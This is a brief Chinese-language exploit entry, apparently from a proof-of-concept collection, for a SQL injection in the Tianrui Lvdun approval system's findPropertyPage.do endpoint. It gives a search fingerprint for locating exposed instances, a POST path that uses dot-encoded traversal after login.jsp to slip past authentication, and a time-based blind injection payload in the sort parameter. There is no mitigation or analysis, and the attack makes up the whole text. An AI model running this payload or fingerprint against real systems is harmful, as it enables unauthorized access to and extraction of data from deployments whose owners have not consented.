# 天锐绿盾审批系统findPropertyPage.do存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/login.jsp/.%2e/invoker/findPropertyPage.do HTTP/1.1`

**Payload**
```
tenantId=1&categoryId=1&sort=id%20OR%20(SELECT+1337+FROM+(SELECT(SLEEP(5)))test)&order=asc
```
- **响应特征**：200